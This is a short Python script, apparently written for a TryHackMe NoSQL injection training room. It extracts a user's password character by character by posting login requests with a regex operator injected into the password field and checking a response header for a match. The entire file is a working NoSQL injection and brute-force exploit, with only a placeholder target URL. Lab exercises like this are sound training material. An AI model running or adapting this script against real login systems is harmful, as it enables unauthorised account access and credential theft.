#!/usr/bin/env python3

# Sample NoSQL Password Brute-Forcing script for TryHackme "NoSQL injection Basics" room 

import requests
import string
import sys

print("Brute-Forcing password length of 8")

def brute(data):
    proxies = {"http":"http://127.0.0.1:8080"}
    r = requests.post("<URL>", data=data, proxies=proxies)
    #For debugging
    #import pdb; pdb.set_trace()
    if "Pragma" in r.headers:
       return True

password = ""
iteration = ""
for i in range(8):
    for char in string.printable:
        password = iteration + char
        print("\r",password,flush=False,end="")
        data = {"user":"john","pass[$regex]":f"^{password}","remember":"on"}
        if brute(data):
            iteration += char
            break
print()

